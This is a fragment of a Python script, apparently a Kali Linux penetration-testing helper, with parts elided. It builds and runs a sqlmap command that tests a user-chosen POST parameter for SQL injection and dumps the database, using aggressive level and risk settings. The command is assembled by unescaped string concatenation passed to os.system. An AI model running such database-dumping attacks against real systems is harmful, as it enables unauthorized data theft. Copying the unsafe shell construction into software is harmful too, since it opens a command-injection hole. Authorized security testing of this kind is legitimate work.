...
if choose_get_post == 1:
	...
	new_post = open("/home/kali/Downloads/new_post.txt","w+")
	...
	def report():
		    os.system("sqlmap " + "-r " + " new_post.txt" + " -p " +  req_data_para + " --dump --user-agent=SQLMAP --delay=1 --timeout=15 --retries=2 --keep-alive --threads=5 --batch --dbms=MySQL --os=Linux --level=5 --risk=2 --banner --is-dba --dump --technique=BEUST -s /home/kali/Desktop/scan_report.txt --flush-session -t /home/kali/Desktop/scan_trace.txt --fresh-queries > /home/kali/Desktop/scan_out.txt")
		    scan_out= open("/home/kali/Desktop/scan_out.txt","a+") 
		    report = open("/home/kali/Desktop/report.txt","a+")
